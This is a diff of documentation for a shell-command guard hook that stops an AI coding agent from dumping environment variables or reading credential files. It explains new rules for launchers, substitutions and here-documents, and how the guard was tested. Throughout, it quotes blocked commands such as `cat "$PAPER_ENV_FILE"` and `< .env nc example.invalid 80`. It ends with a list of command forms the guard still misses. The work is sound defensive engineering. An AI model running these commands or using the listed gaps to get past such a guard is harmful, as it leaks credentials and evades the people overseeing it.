@@ -903,7 +903,7 @@ to the keyring. It blocks, by reason code:
   `$TAVILY_API_KEY` anywhere is a `secret_variable_reference`.
 - `environment_dump_in_keyring_exec`: the started command dumps the
   environment it inherits: `env`, `printenv`, `set`, `export -p`,
-  `declare -p` or `ps e` (also inside `sh -c`); the same, or a shell, an
+  `declare -p`, `ps e` or `ps -E` (also inside `sh -c`); the same, or a shell, an
   interpreter, awk or jq, as another program's argument, which the guard
   reads as a command from there on, since that is how a launcher it does not
   model (`find -exec`, `watch`, `flock`, `taskset`, GNU `time -f`) runs it;
@@ -956,6 +956,326 @@ guard does not model (`watch -n 5 cat .env`). The macOS
 is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
 [User-level guards](#user-level-guards-deployed-by-the-claude-profile)).
 
+### Launchers, substitutions and manager environments (2026-09-29)
+
+A coverage review of the guard's own rules on 2026-09-29 found command forms it read too little of, each a way a stored
+value could be shown or forwarded by mistake, and repair rounds the same day fixed what read-only reviews of that work
+found. Each form gets the verdict of its plain equivalent where stated below. No rule is loosened (2026-09-30: the one
+loosening an earlier round made, for the value of a clustered value-taking `ps` option, is withdrawn, and `check()`
+reads every command as the base guard read it as well; see "No loosening" below), so a command that the base guard
+(main at c26800f3) blocked is blocked now, and `tests/test_secret_path_guard.py` keeps every earlier row except two that
+recorded the `systemd-run` gap and moved from `EXPECTED_PASS_THROUGH` to `BLOCKED`. The guard is a text reader of one line of shell, not a shell: what it does not
+read is listed at the end of this subsection.
+
+- **systemd's launchers are modelled: `systemd-run`, `run0`, `systemd-inhibit`, `systemd-cat`.** Each one's own options
+  are skipped as getopt reads them, redirections between them included (`systemd-run --user 2>/tmp/log --pipe printenv`),
+  and the command it starts gets every rule, a nested `bash -ic '...'` string too. The option tables come from upstream:
+  `src/run/run.c` at systemd v255 for `systemd-run` (getopt string `+hrH:M:E:p:tPqGdSu:`), with the value options of later
+  releases listed so a newer host's command is still found (`--capsule`/`-C` and `--background` from v256, `--json` from
+  v257, `--job-mode` from v258, `--root-directory` from v259 and `--output` from v261, each read in `run.c` at that tag);
+  `parse_argv_sudo_mode` in `run.c` at v256 to v262 for `run0`; `src/login/inhibit.c` and `src/journal/cat.c` for
+  `systemd-inhibit` and `systemd-cat`. What a launcher prints goes to the caller with `systemd-run --pipe` (`--wait`
+  shows terse unit information, and without either the output goes to the journal, `systemd-run(1)` 255), and
+  `systemd-cat` writes it to the journal, so `systemd-run --user --pipe --wait cat "$PAPER_ENV_FILE"` is a
+  `credential_file_read`, `... printenv` and `systemd-cat printenv` an `environment_dump`. The trading lane's loader path
+  (`systemd-run --user --unit=X --collect /bin/bash -ic 'exec python3 runner.py run --env-file "$PAPER_ENV_FILE_2"'`)
+  still passes for both accounts. A secret variable name (any name in the guard's list), with or without a value, set
+  through `systemd-run`'s `-E`/`--setenv` or `-p Environment=...` is a `secret_variable_on_command_line`. Where the value
+  goes differs by form (systemd v255, read 2026-09-29). `-E NAME=value` puts the value in the command line of the
+  `systemd-run` process itself (its argv: `/proc/PID/cmdline` and the process listing show it while `systemd-run` runs) and
+  in the transient unit's `Environment` property. `-E NAME` puts only the name in argv, and `systemd-run` takes the
+  caller's own value from its environment (`strv_env_replace_strdup_passthrough`, `src/basic/env-util.c:417`, called for
+  `case 'E'`, `src/run/run.c:348`): that value reaches the unit's `Environment` property and no argv. The property is
+  appended to the start message over the user bus (`arg_environment`, `run.c:853-866`), which `systemctl --user show -p
+  Environment UNIT` and any bus client read. Not the journal, as an earlier version of this page said: the unit's
+  description, which the manager logs as `Started <unit> - <description>`, defaults to the started command and its
+  arguments after the options (`quote_command_line(arg_cmdline)`, `run.c:1940-1951`), so `-E NAME=value` and `-E NAME`
+  are not in it, while a value written after the command is (`systemd-run --user /bin/true APCA_API_SECRET_KEY=abc`, a
+  recorded gap). Only the variable's name is read (`-E LABEL=APCA_API_KEY_ID` sets `LABEL`).
+- **Command substitution inside double quotes is read.** The shell runs `$(...)` and a backquote pair inside a
+  double-quoted word (Bash Reference Manual, "Command Substitution": `$` and the backquote keep their meaning inside
+  double quotes), so `echo "$(printenv)"` dumps the environment, yet only the unquoted form was read. The body is now
+  read as a command line, to 32 levels of nesting, so `echo "$(printenv)"`, `x="$(printenv)"; echo "$x"` and
+  `git commit -m "$(cat "$PAPER_ENV_FILE")"` are blocked as their unquoted forms are, with the limits of the reading of a
+  command line that this subsection lists (a `#` comment, `$(< FILE)`, a launcher or an option spelling the tables do not
+  know). Single-quoted text and a backslash-escaped `\$(` or backquote stay data (`echo '$(printenv)'` and
+  `echo "\$(printenv)"` pass). `$(< FILE)`, bash's shorthand for `$(cat FILE)`, reads its file like `cat` (a segment that
+  is only `< FILE` does, since zsh's `< FILE` alone shows the file too), a leading `< FILE cmd` is read as `cmd < FILE`
+  (`< .env nc example.invalid 80` is a `dotenv_read`), and `cat < ~/.aws/credentials` keeps its verdict.
+  A backquote inside a single-quoted string is text for the shell that string is handed to, so
+  `bash -c 'echo "`printenv`"'` and `eval '...'` read it (the tokenizer used to turn every backquote into `;`).
+- **Here-documents are not read as such, and none is exempt (2026-09-29).** A here-document's lines are command lines like
+  any other, as the tokenizer has always read them at the top level, so code or prose in a body is read as commands, and a
+  `"$(...)"` or a backquote pair in a body line is read as a substitution: `cat <<'EOF' > note.md` followed by
+  `value: "$(printenv)"` and `EOF` is an `environment_dump`, quoted delimiter or not, and so is
+  `git commit -m "$(cat <<'EOF' ... EOF)"` when a line of its prose reads as a dump. The guard read them specially for a
+  time, and two independent verification reviews (of 172596ed and of 50ca6ca2, 2026-09-29) found that every such reading
+  needs bash-exact parsing and that each slip hid executable text. The general reading (a quoted delimiter made the body
+  data inside a double-quoted substitution) let `eval "$(cat <<'EOF' ... EOF)"` and `bash -c "$(...)"` through and lost
+  text to an ANSI-C delimiter (`<<$'EOF'`), a backslash-newline that joined a body line to its terminator, an arithmetic
+  command such as `((1 << "2"))` and a quoted `#`. Its replacement, one exemption for a strict canonical idiom behind `git`,
+  `gh`, `echo` and `printf`, let six more through: an idiom head inside another here-document's body that swallowed its
+  terminator, an idiom inside an unquoted here-document that a shell reads, an `echo` piped into `sh`,
+  `git rebase --exec`, a case pattern's `)` that closed a substitution early, and a process substitution that runs a
+  shell. Both readings are gone. What a substitution prints is code for a shell, `eval`, an interpreter, `source`, `xargs`,
+  `ssh` and `git rebase --exec`, a file name for a reader, and only text for `git commit -m`; telling those apart from
+  the words of one command line is what failed twice, so no consumer is trusted and every body is read as command lines,
+  as the base guard read a top-level body. The cost is friction, in the strict direction. A commit message or
+  pull-request body written through `"$(cat <<'EOF' ... EOF)"` is refused when a line of its prose starts with
+  `printenv` or `env` or holds `printenv` in backquotes (behind `git`, `gh`, `echo` and `printf` too), a literal
+  `$(printenv)` example inside a quoted here-document is refused in file-writing (`cat > note.md <<'EOF'`), Python
+  (`python3 <<'PY'`), commit-message (`git commit -F - <<'EOF'`) and pull-request-comment
+  (`gh pr comment --body-file - <<'EOF'`) workflows, and Python's `set()` after a comment line in an interpreter's
+  here-document (`# unique values` and then `print(len(set([1, 1])))`) is refused as the shell's `set`: the base guard's
+  `#` hole hid it, and reading an interpreter's here-document as that interpreter's code is a later change. Write such
+  text with the Write tool and pass the path: `git commit -F FILE`, `gh pr create --body-file FILE`, a script file for the
+  interpreter. Measured 2026-09-29 with the guard of 752def7f: of the 2,015 distinct commit messages on all refs of this
+  repository then (`git log --all`, a count that grows), in the `git commit -m` and `gh pr create --body` patterns, this
+  guard refuses 36 and the base guard 16, and none that the base guard refuses passes; the five real messages that `tests/test_secret_path_guard.py`
+  records (`REAL_COMMIT_MESSAGES`) are among them. Residual gaps, each an inert string in `EXPECTED_PASS_THROUGH`: an
+  unquoted here-document that expands `$(...)` between single quotes (`cat <<EOF` with `'$(printenv)'` in its body),
+  which the base guard passed too.
+- **A `#` comment hides only its own line, and only where a word starts.** The tokenizer joins the lines of a command
+  with `;` and shlex reads a `#` anywhere, `$#` and `a#b` included, as the start of a comment, so a `#` dropped the whole
+  rest of the command: `# macOS` followed by `ps -E`, `echo ${#PATH}; printenv` and
+  `gh api repos/o/r/issues/1#c; cat "$PAPER_ENV_FILE"` all passed, as did every command after a `## Summary` heading. A
+  comment is now removed only from a `#` that starts a word, outside quotes and double-quoted substitutions, to the end
+  of its line (Bash Reference Manual, "Comments"), and the guard keeps its earlier reading of the same command besides,
+  so nothing it read before is dropped (up to 200,000 characters: tokenizing costs about 9 microseconds a character inside
+  quotes, and two readings of an 840 KB message took 17.8 s against a 10 s hook timeout, one reading 8.9 s). Inside a
+  `$(...)` body a comment also runs to the end of its line (`echo "$(date # )` newline `printenv` newline `)"` runs
+  printenv). In a here-document body a comment likewise hides only its own line: the lines of a script written through a
+  here-document are read as commands, which the `#!` line of the script hid for a time. What this newly blocks, measured on
+  this repository (2026-09-29): 4 of its 201 shell scripts when written through a here-document (their array literals
+  `X=(env HOME=...)`, which the guard reads as an `env` with no command), one of 785 fenced blocks (a python
+  `len(set(found))`) and none of 4,338 fenced lines; the same array literals and python `set(...)` were always read as
+  commands when a whole script is passed as one command string.
+- **ANSI-C strings are data.** `$'...'` runs to the first `'` that a backslash does not escape, so
+  `printf '%s' $'it\'s "$("printenv")"'` holds no substitution and passes; inside double quotes `$'` is no such string.
+  shlex knows no ANSI-C quoting (it read `$'it\'s #\nprintenv\n'` as a word, a quote that opens and a comment, and the
+  harmless text was refused), so the tokenizer keeps each such string as one word of the same text, its `\'` written as a
+  quote shlex reads: `printf '%s' $'it\'s #\nprintenv\n'` passes and `bash -c $'printenv'` is read as `bash -c printenv`.
+  Escapes such as `\n` and `\x..` are not decoded.
+- **Arithmetic expansion is no command.** `$((` opens an arithmetic expansion only when a `))` that touches closes it:
+  `env=2; echo "$((env))"` reads the variable `env` and a `<<` in it is a shift, so both pass, while a real substitution
+  inside it (`$(( $(printenv | wc -l) + 1 ))`) is still read and `$((printenv) )`, whose parentheses do not touch, is a
+  substitution holding a subshell, as bash reads it.
+- **`ps` prints the environment on two hosts, and the guard reads a command line as both (2026-09-29).** macOS `ps`
+  documents `-E` as "Display the environment as well" and lists the BSD-style `e` as "Same as -E" (Apple `adv_cmds`
+  `ps.1`, read 2026-09-29), and procps-ng `ps` (Linux, 4.0.4 here) documents the BSD-style `e` as "Show the environment
+  after the command" and has no `-E`. The guard blocks, as an `environment_dump`, a dashless cluster with `e` or `E`
+  (`ps eww`, `ps auxe`, `ps Eww`, `ps auxE`) and `-E` alone or in a cluster before the first letter that takes a value
+  (`ps -Ewwp 123`, `ps -p 123 -E`, `ps -A -E`). Both hosts read a dashed word as a cluster of option letters, and a letter
+  that takes a value takes the rest of the word or, when it ends the cluster, the next word: `-o`, `-O`, `-p`, `-u`,
+  `-U`, `-g`, `-G`, `-t` on both, `-C`, `-q` and `-s` on procps. So that next word is a value and no cluster of flags in
+  each host's default reading: `ps -u Eve`, `ps -fu Eve` and `ps -uEve` pass. The guard reads a third way besides, the base
+  guard's (2026-09-30): procps has personalities, `PS_PERSONALITY=old` or `I_WANT_A_BROKEN_PS` set on the command line or
+  inherited from the shell (which a hook cannot see), under which `ps -axu e` is parsed BSD-style, `u` takes no value and
+  `e` shows the environment (third verification review, from the procps-ng 4.0.4 manual and `/usr/bin/ps`). So a dashless
+  word of the base guard's cluster alphabet with an `e` is refused after any cluster, as the base guard refused it: `ps -fu
+  steve`, `ps -fu eve`, `ps -fo user`, `ps -ft e`, `ps -fU steve` and `ps -fC e` are an `environment_dump`, which an earlier
+  round of this work had let through. A stand-alone value option still takes the next word (`ps -u steve` and `ps -C
+  emacs` pass, as with the base guard; whether a personality reads a stand-alone `-u` BSD-style too is not measured here).
+  The forms that pass whatever the user name are a numeric id (`ps -f -U 1000`, `ps -fU 1000`) and `pgrep`
+  (`pgrep -a -u steve node`), each checked against the guard of this change. `ps -ef`, `ps -o pid,command -p N` and
+  `ps aux` pass, and a dashed `-e` is every process. The two hosts differ where the guard has to read both. `-C` takes a command name on procps (`ps -C
+  cmdlist`) and is a flag on macOS ("Change the way the CPU percentage is calculated": Apple `adv_cmds` `ps/ps.c` at
+  60bc9ebf, `PS_ARGS` `aACcdeEfg:G:hjLlMmO:o:p:rSTt:U:u:vwx` and `case 'C': rawcpu = 1`). procps reads a dashless
+  BSD-style word wherever it stands, macOS only as the first argument (`kludge_oldps_options` is applied to `argv[1]`
+  only; a later word is a process id or an "illegal argument"). A command line is refused when either reading shows the
+  environment: `ps -CE` and `ps -C -E` (macOS: `-E` is a flag), `ps -Ccat e` and `ps -fCcat e` (procps: `cat` is the
+  command name and the BSD `e` shows the environment; on macOS `t` takes `e` as a tty), and `ps -CEmacs`, which is
+  friction on procps (there `Emacs` is the command name; write `ps -C emacs`). Checked on this host (procps-ng 4.0.4):
+  `ps -Cbash u` honours the BSD `u` after the glued command name, and `ps -fC bash u` reports conflicting format options
+  (the `u` is a BSD option after `-C bash`). The guard reads no macOS legacy mode, where `-e` is read as `-E` (in
+  `ps.c`, `case 'e'` falls through to `case 'E'` when `u03`, its `unix2003` compatibility flag, is off): it would refuse
+  every `ps -ef`, so it stays a recorded gap. The dashless cluster test is a set-membership test (see the timeout item).
+- **`systemctl show-environment` and a bare `systemctl show` are environment dumps.** `show-environment` prints a
+  service manager's whole environment block, "the environment block that is passed to all processes the manager spawns"
+  (`systemctl(1)` 255), and `show` with no unit prints the manager's own properties, `Environment=` among them, so
+  every variable the session imported into that manager, a credential included, lands in the output. Both are blocked as
+  a `service_manager_environment`, with or without `--user`, behind any options (the option table of
+  `src/systemctl/systemctl.c` at v255 says which words are values: `-M host`, `-H user@host`, `-o json`), behind a
+  launcher and inside a substitution; `show` passes when a unit is named or `-p` names other properties only. For one
+  unit use `systemctl --user show -p Environment UNIT`; for the `PATH` a unit sees run a command in one:
+  `systemd-run --user --pipe --wait --collect /bin/sh -c 'command -v node; echo "$PATH"'`. `systemctl --user cat`,
+  `status` and `list-units` pass. Inside a keyring exec, behind a launcher the guard does not model (`watch`, `flock`),
+  `systemctl` and the systemd launchers are read like the shells and `env` already are.
+- **Launchers named by their path are the same launchers** (`/usr/bin/sudo systemctl show-environment`,
+  `/usr/bin/timeout 5 printenv`): the wrapper walk compared the whole word.
+- **A redirection between a launcher's hops is read wherever it stands (2026-09-29).** Bash removes a redirection from the
+  argument list wherever it stands, so `env -u < "$PAPER_ENV_FILE" UNUSED cat` is `env -u UNUSED cat < "$PAPER_ENV_FILE"`.
+  The launcher walk took the operator for the value of `-u`, `--unit`, `-n` and the like, dropped the segment that held the
+  operand and let that string and `systemd-run --pipe --unit < "$PAPER_ENV_FILE" demo cat` through, both refused by the
+  base guard (found by the independent verification review of 172596ed). Now each raw segment is read as written beside
+  any walk; the walkers (`env`, `systemd-run` and its siblings, `sudo`, `nice`, `timeout`, `rtk`, a keyring exec) step
+  over a redirection operator and its target wherever they look for an option, a value or the started command, so they
+  never take one for a value; and an input redirection they stepped over is read with the command that gets it. For every
+  launcher, every position between its hops and each of `<`, `<<<`, `2>`, `>`, `>>` and `&>`, the verdict is the one the
+  same command gets with the redirection written last (684 combinations in the tests, none looser than the base guard; 166
+  stricter, the operand of a `cat` that the base guard missed because it stood before the command, as in
+  `env -u UNUSED < .env cat`). A number before an operator still ends the options of `sudo` and `nice`
+  (`sudo 2>/dev/null -u root printenv`): the launcher walks take a number for a value, a recorded gap. Since 2026-09-30
+  the base guard's own walk, which took an operator for the value of `sudo -u` or `env -u`, is read as well (see "No
+  loosening"). A redirection is no argument of `set`, `export`, `declare` and `typeset` either: `set > FILE` and
+  `set < FILE` still print every variable (`set a b` sets positional parameters), so they are an `environment_dump` now;
+  the base guard passed them, and without this the redirection that a keyring exec's arguments carry to the command it
+  starts would have made `exec name VAR < FILE -- set` pass, which the base guard refused (found by a grammar fuzz of
+  600,000 launcher chains with redirections against the base guard, now 0 looser). A number is a redirection's
+  descriptor there only when it touches the operator (2026-09-30, third verification review): bash reads `1>out` as a
+  redirection of descriptor 1 and `1 > out` as the word `1` and a redirection, but shlex splits the two alike, so the
+  tokenizer marks a number (or `{name}`) that touches `<` or `>` before it splits the text, and the dump rule counts only
+  such a number as a descriptor. `set 1 > out` and `set 3 < input` set positional parameters and pass, as they did with
+  the base guard (the round before this one refused them), while `set 1>out`, `set >out` and `set 2>/dev/null` print
+  every variable and stay an `environment_dump`; the base guard passed those three.
+- **An internal error blocks; a timeout does not.** Only exit 2 blocks a PreToolUse call. `main()` now catches any
+  exception from the rules (`RecursionError` and `MemoryError` included) and blocks with one line,
+  `blocked (guard_error)`, that names no command text and prints no traceback. A hook that runs past its timeout is
+  cancelled and the call goes ahead (Claude Code hooks documentation, "Timeouts", read 2026-09-29: "A timed-out
+  `command`, `http`, or `mcp_tool` hook doesn't block the tool call"), and the guard's hook timeout is 10 s, so the time
+  the rules take is part of the guard's safety and no timer inside the hook can replace it. That is why the substitution
+  scan reads each text in one pass (a stack of frames and a regular expression that jumps between the characters that
+  matter, not a rescan per arithmetic shift or per nesting level), a chain of `env`, `rtk` or `systemd-run` launchers is
+  walked by index instead of copying the rest of the command at every hop, and the bodies read behind double-quoted
+  substitutions are capped at 32 levels and at four times the command's length plus 64 KiB.
+  **Not every text rule was linear (corrected 2026-09-30).** An earlier version of this item said that every text is
+  scanned in one pass; the third verification review found raw-text rules that run before any work budget and are
+  quadratic on a repeated prefix: the `STORE_PATHS` patterns for `${XDG_CONFIG_HOME:-...}` and `${HF_HOME:-...}` and
+  the `/proc/.../environ` path read the unbounded run after their literal again from every repeat (102,016 characters of
+  `XDG_CONFIG_HOME:-` took 11.9 s, 54,000 of `HF_HOME:-` 13 to 14 s, 80,000 of `/proc` 13 to 15 s, and the real hook
+  was killed at 10.5 s with no verdict), and a probe of every text rule found a fourth, `gh auth status ... -t`. Each is
+  now a linear scan (`LinearScan` in the guard) that splits the text once into the runs the pattern cannot cross and
+  searches each run for literals; old pattern against new scan, 7,229,043 generated texts a pattern (2,000,000 random
+  and every text of up to six fragments) gave the same answer, and the tests keep 100,000 random texts a pattern. With
+  the patterns linear, one unquoted word of 199,000 characters still cost 0.53 s in shlex, which copies the word at each
+  character, so a text with no quote and no backslash is split without shlex (`SHLEX_PLAIN`: what shlex's state machine
+  reduces to there, checked against shlex on 2,111,111 texts in both readings). A `find` read the prefix of each of its
+  actions from a copy of the rest of the words (3.9 s on 49,000 `-ok`; 18,000 `-exec sudo` did not finish in 60 s);
+  each action's prefix is walked by index now, each position once, and an action followed by an option word is not
+  walked at all. Measured in-process on 2026-09-30 with the final guard: the review's four inputs take 0.01 to 0.07 s,
+  the `find` input ending in a harmless command (which both readings read) 0.10 s, and every `STORE_PATHS` pattern's
+  leading literal repeated to 199,000 characters at most 0.12 s, before a dump or a harmless command; the real hook
+  answers the review's inputs in under a second (the tests bound these at 0.5 s of processor time and 1 s of wall
+  clock, wider in CI). The prior reading (see "No loosening") copies the rest of the words
+  at every `env`, `rtk` or keyring hop, as the base guard did, and spends the same budget: a chain that ends in a
+  harmless command passes up to 1,410 bare `env` or 997 two-word hops (`rtk proxy`, `env FOO=1`) and is refused as
+  `command_too_complex` beyond, in under 0.2 s at 20,000 hops (the base guard took 29 s and 56 s there).
+  Measured on this host with the inputs of `PATHOLOGICAL` in `tests/test_secret_path_guard.py`: the first version of the
+  substitution scan took 10 s on 12,000 here-documents and on 12,000 lines of `$((1 << 2))`, and ran past a minute on
+  60,000 nested `systemd-run`; the launcher walk that predates this work took 29 s on 20,000 nested `env` and 56 s on
+  20,000 nested `rtk proxy`. Each input now takes under a second (the test bounds it at 3 s). The dashless `ps` cluster
+  test is a set-membership test since 2026-09-29: the regular expression before it had two overlapping quantifiers and
+  took 13 to 15 s on `ps` followed by 70,000 `E` and a letter that is no flag (a hook past its timeout fails open), and a
+  test now times every compiled pattern of the guard on 70,000-character repeats. Tokenizing is shlex's, about 9
+  microseconds a character inside quotes, so from 2026-09-29 `main()` also refuses a command of more than 200,000
+  characters as `command_too_large` (exit 2, one line that names no command text, with the hint to put the content in a
+  file with the Write tool and pass the path): measured that day, one quoted word of 1,000,000 characters took 10.2 to
+  13.0 s in `check()` (the base guard too), 600,000 took 3.8 to 4.4 s, 500,000 took 2.9 to 3.3 s and 200,000 took 0.6 s,
+  and a hook that times out blocks nothing.
+  **The size cap does not bound the work (2026-09-29).** The second verification review found a command of 9,645
+  characters that took 13 s (a keyring exec whose started command holds 1,200 `python3` words: the analysis reads every
+  suffix of them as a command, 5.8 million characters through shlex; the base guard took 2.1 to 2.8 s, the guard of
+  50ca6ca2 12 to 13 s, and 5,000 words ran past 45 s) and one of 195,068 characters that took over 25 s (four-byte
+  characters cost four times as much to tokenize, and five nested double-quoted substitutions read the text at every
+  level; the reviewer's run passed 25 s without a verdict, here the base guard took 1.6 s and the guard of 50ca6ca2 15.7 to
+  17.9 s). `check()` therefore reads a command inside one
+  work budget per call (`WORK_LIMITS`): (a) the characters passed to shlex over every reading and nesting level, each
+  counted at its storage width (1 byte for ASCII and Latin-1, 2 for the rest of the Basic Multilingual Plane, 4 beyond, as
+  shlex costs 0.41, 0.85 and 1.70 s on 200,000 characters of one quoted word), at most 400,000; (b) the texts read (the
+  command, each double-quoted substitution body, each `sh -c` or `eval` string, each keyring read), at most 10,000, the
+  words of the segments that reading emits (a segment counts its words and one), at most 1,000,000, and the
+  launched-command reads of the keyring analysis (the started command and each interpreter or launcher word inside it read
+  again as a command), at most 500. The keyring analysis also drops identical segments before it reads them, scans the
+  command once for each pattern instead of once for each started command, and tests the mentions of an injected variable
+  against the starts of the `exec` arguments instead of against every span (3,500 keyring execs of one variable, each
+  starting a distinct program, took 268 s before these changes, 4,000 distinct keyring execs 25 s).
+  When a counter passes its limit `check()` raises `WorkBudgetExceeded`, not a reason, so no caller can take a command it
+  could not read for one it allowed, and `main()` refuses it: exit 2, `blocked (command_too_complex)`, one line, no command
+  text, the hint to split the command or put the content in a file with the Write tool. The two reviewer inputs are refused
+  in 0.15 s and 0.04 s, as are their 600- and 5,000-word variants of the first (0.15 s each); a keyring exec with 60
+  interpreter words stays inside the budget and reports its dump. Measured just under each limit, one counter at a time
+  (the timing rows and `tests/test_secret_path_guard.py`): 398,000 characters of one quoted word and a `#` (two readings)
+  1.1 s, 390,000 units of two-byte characters 0.9 s, 396,000 of four-byte 0.5 s, 9,900 texts 0.3 s, 1,000,000 words 0.2 s
+  (40 keyring execs over a 20,000-word tail spend 1,005,859 in 0.18 s), 490 reads 0.03 s. 1,000 random mixes of 22
+  adversarial building blocks at 199,000 characters took at most 0.91 s, and 64 shape families at 25,000 to 199,000
+  characters at most 1.1 s (the shapes that grow faster than linearly are one long shlex token, which the
+  200,000-character cap bounds at 0.5 s; since 2026-09-30 only a quoted one, see above). On 2026-09-30, with both
+  readings, the same 1,000 mixes took about a second at most (0.93 to 1.07 s over runs at load averages of 7 to 23,
+  this guard and the guard of 6c4f63d7 alike: the slowest mix is one quoted word of two-byte characters, which shlex
+  still reads a character at a time), and the median mix 0.17 s (0.24 s before). Each figure is a run on a shared host: the same
+  192,000-character quoted word took 0.8 s alone and 1.7 s at a load average of 8, so read a figure as within a factor of
+  two. The largest real command of this repository, an 82,000-character script written through a here-document, spends
+  34% of the characters, 1% of the words and texts and under 1% of the reads with both readings (measured 2026-09-30).
+  An earlier version of this item said that no commit message comes near a limit; on 2026-09-30 the refs held 2,305
+  distinct messages (a count that grows), and in the `git commit -m "$(cat <<'EOF' ...)"` pattern, where a message is
+  read twice as a body, the largest (110,892 characters) needs 116% of the characters and two messages pass the budget
+  and are refused as `command_too_complex`, as the guard of 6c4f63d7 refused them; `git commit -F FILE` passes them.
+  Nothing in the fences and scripts comes near a limit. The friction is a command that needs more than that, measured
+  as the largest size that still passes (2026-09-30, with both readings): a text whose characters, counted at their
+  storage width and once for each reading (two when it holds a `#`), pass 400,000 (an ASCII script of 199,990 characters
+  with a `#`, a two-byte text of 199,993 characters without one, a four-byte text of 99,993), more than 4,999 `sh -c`
+  strings (9,999 before the prior reading, which reads each one again when the command passes this version's reading) or
+  9,998 substitution bodies, more than 445 keyring execs nested in one another (40 in front of a 1,000-word tail), more
+  than 250 keyring execs that each launch a program, more than about 300 interpreter words in a row after a keyring
+  exec, more than about 380 distinct injected variables in a 10,000-character command, or a launcher chain longer than
+  above. Write such content with the Write tool and pass the path. `check()` itself has no size limit, and a
+  substitution nested beyond the caps above is still not read.
+- **No loosening against the base guard (c26800f3), 2026-09-30.** An earlier round of this work loosened one rule on
+  purpose, the value after a clustered value-taking `ps` option, and said that those `ps` forms were the only commands
+  that the base guard refused and this guard passed. Both are withdrawn. The third verification review found that the
+  loosening lets procps personalities through (see the `ps` item), and that the claim was false besides: the base guard
+  refused `systemd-run --description kernel_keyring.py exec name X -- keyctl print 123` (`keyring_payload_read`) and
+  `... -- cat .env` (`dotenv_read`), and this guard passed both, because its `systemd-run` walk took the keyring script for
+  the value of `--description` and never unwrapped the keyring exec. (The strings run no reader: `systemd-run`'s command
+  is then `exec`. The rule is the base guard's verdict, not whether a string leaks.) A probe of the class found more of it:
+  the option values of `run0`, `systemd-cat` and `systemd-inhibit`, a path-qualified wrapper whose option value is the
+  script (`/usr/bin/sudo -u kernel_keyring.py exec a B -- cat .env`), a `systemd-run` inside a keyring exec, and a
+  redirection operator that the base guard's walk took for the value of `sudo -u`, `nice -n` or `env -u`
+  (`sudo -u > printenv x`). Rather than find each walk that reads a word differently, `check()` now reads the words of
+  every command twice: as this guard reads them and, when that reading allows the command, as the base guard read them
+  (`prior_reading`: that guard's own walk and rules, spending from the same work budget), and refuses what either reading
+  refuses; the `ps` rule applies the base guard's reading besides. No command the base guard refused passes, by
+  construction, and each string above is a `BLOCKED` row with the base guard's reason. Measured in-process on 2026-09-30
+  against the base guard's file (sha256 f9be81b2), with the final guard: the prior reading gives the base guard's verdict
+  on every one of 460,910 commands (the test tables in 17 launcher prefixes and 6 suffixes, every fenced line of the
+  repository, 19,296 launcher option-value commands in which each value-taking option of every launcher the guard walks
+  or reads is followed by a reader, a keyring exec chain or a dump, in twelve spellings and glued, and ten seeded mutants
+  of each of the 34,993 strings the base guard refuses), and `check()` loosens none of them. Nothing is loosened either by
+  a differential over 88,207 commands (1,117 table and oracle rows in 11 launcher prefixes and 6 suffixes and in
+  `bash -c`, `sh -c`, `eval` and substitutions, and the launcher option-value commands), the 806 fenced blocks, 4,454
+  fenced lines and 202 scripts of this repository (written through a here-document and as one command), two fuzzers of
+  60,000 random strings, eleven grammar fuzzes of 60,000 launcher chains or here-document placements and one of 100,000
+  mixed, six seeds of a mutation fuzz (27,600 mutants of the 460 strings the base guard refuses, each), 478,915
+  generated `ps` lines, the 40-consumer matrix of 115,200 commands, the 684 launcher redirection positions, the 2,518
+  distinct commit messages of all refs in three patterns, and the hook run as a process on 42 inputs (the last round's
+  26, three of them the `ps` forms refused again, and this round's). The 44 commands of that differential that both
+  guards refuse for different reasons (this guard reads a credential file sourced in a substitution or behind
+  `systemd-run` and says `environment_dump_after_source` where the base guard said `environment_dump`) get the same
+  reasons from the guard of 6c4f63d7: none is new in this round. Of the 342 rows that this work adds to `BLOCKED` and
+  `KEYRING_BLOCKED` (against the tables at c26800f3), 245 are refused only by this guard (the base guard passed them)
+  and 97 are regression controls that the base guard already refused (the third review counted 240 and 67 before this
+  round); the friction cases that review lists (a commit message, pull-request body, file text or Python here-document
+  whose line reads as a dump or as the shell's `set`) stay documented friction, in the here-document item above.
+- **Alternatives considered for reading shell syntax (2026-09-29).** A full shell parser was not adopted: the hook is one
+  standard-library file that the profile installer copies verbatim to the host, and each candidate would have to be
+  vendored per platform and started per call. `bashlex` 0.18 (PyPI 2023-01-18, GitHub last pushed 2024-04-08, GPL-3.0)
+  is stale, `tree-sitter-bash` (pushed 2026-09-13, MIT) needs compiled bindings, and `mvdan/sh` (pushed 2026-09-28,
+  BSD-3-Clause) is a Go binary. The hand-written reading is checked by a differential against the previous guard on
+  generated commands and on this repository's own fences and scripts instead, and it stays a text heuristic.
+
+What the guard does not read, each an inert string that `tests/test_secret_path_guard.py` records in
+`EXPECTED_PASS_THROUGH` where it passes: a case pattern's `)` closes a `$(` (`echo "$(case x in x) printenv;; esac)"`),
+bash 5.3's `${ command; }`, a backquote escaped inside a double-quoted wrapper string
+(`bash -c "echo \"\`printenv\`\""`), a long option abbreviated to a unique prefix, which getopt_long accepts
+(`systemd-run --mach host --pipe cat .env`, `--uni demo`), `systemd-run -p PassEnvironment=NAME` and words after the
+started command, `run0 --setenv=NAME` (no secret name is read on a `run0` line), `machinectl shell .host /usr/bin/printenv`
+and `busctl --user get-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager
+Environment`, and a substitution nested beyond 32 levels or past the work budget (shlex's quote parity happens to expose
+the innermost command of `"$(echo "$(...)")"` one level down, so the tests count the texts read instead). The other
+way, the guard reads as commands what is not one: an array literal `x=(env -i A=b)`, a python `set(...)` in a script
+body and prose in a here-document that looks like a command (its lines are command lines, above), and an `E`
+after `ps -C` that is a command name (`ps -CEmacs`).
+
 ## Threat model and what each guard stops
 
 | Layer | Stops | Does not stop |
@@ -964,7 +1284,7 @@ is replaced (`tools/adoption/install_claude_profile.py --only guard`, see
 | `scripts/git-hooks/pre-commit` (gitleaks on staged changes) | known secret shapes in a commit, before it is made | `--no-verify`; clones where `core.hooksPath` is not set; values with no recognizable shape |
 | CI gitleaks (`validate.yml`), GitHub secret scanning and push protection (public repo) | pushes and history that contain known provider patterns | anything not yet pushed; custom formats. This layer only reacts after the fact |
